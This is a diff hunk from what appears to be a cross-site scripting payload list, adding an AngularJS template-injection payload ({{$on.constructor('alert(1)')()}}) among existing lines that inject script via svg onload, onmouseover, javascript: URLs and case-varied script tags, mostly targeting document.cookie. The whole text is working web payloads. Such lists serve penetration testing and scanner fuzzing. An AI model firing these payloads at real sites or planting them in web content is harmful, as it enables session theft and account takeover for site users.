@@ -5,6 +5,7 @@ javascript:prompt(document.cookie)
 '-alert(document.cookie)-'
 </script><svg onload=alert(document.cookie)>
 "onmouseover=alert(document.cookie)//
+{{$on.constructor('alert(1)')()}}
 <Script>alert(document.cookie)</Script>
 <sCript>alert(document.domain)</sCript>
 <script>alert(document.cookie);</script>
